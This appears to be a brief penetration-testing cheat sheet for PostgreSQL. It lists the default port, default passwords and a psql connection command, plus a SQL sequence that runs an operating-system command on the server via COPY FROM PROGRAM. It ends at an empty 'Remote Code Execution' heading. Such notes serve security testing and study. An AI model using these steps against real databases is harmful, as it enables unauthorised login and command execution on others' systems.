# PostgreSQL
- Default Port: 5432

## Default credentials
```
postgres:<empty>
postgres:postgres
```

## Connection
```
psql -h 192.168.58.47 -U postgres -p 5437
```

## CLI Commands
- `\l`: List Databases

## System Command Execution
```sql
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

## Remote Code Execution (RCE)
